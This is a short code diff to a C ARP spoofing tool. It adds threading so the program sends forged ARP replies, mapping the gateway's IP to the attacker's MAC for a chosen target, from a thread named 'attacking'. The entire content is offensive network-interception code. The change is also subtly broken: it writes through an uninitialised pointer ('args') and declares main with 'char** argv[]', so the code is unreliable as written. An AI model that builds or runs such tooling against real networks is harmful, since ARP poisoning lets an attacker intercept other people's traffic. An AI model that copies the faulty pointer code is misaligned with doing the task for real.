@@ -1,4 +1,5 @@
 #include "arpspoof.h"
+#include <pthread.h>
 
 
 void usage()
@@ -81,5 +82,16 @@ int main(int argc, char** argv[]){
     fprintf(stderr, "Target MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
 
 
-    send_arp_reply_fmac(sock_r, socket_address, addr_len, my_mac, target_mac, ip_gateway, ip_target);
+    pthread_t attacking;
+
+    attacking_args_t *args;
+    args->sock_r = sock_r;
+    args->socket_address = socket_address;
+    args->addr_len = addr_len;
+    args->my_mac = my_mac;
+    args->target_mac = target_mac;
+    args->gateway_ip = ip_gateway;
+    args->target_ip = ip_target;
+    pthread_create(&attacking, NULL, send_arp_reply_fmac, (void*) args);
+    pthread_join(attacking, NULL);
 }
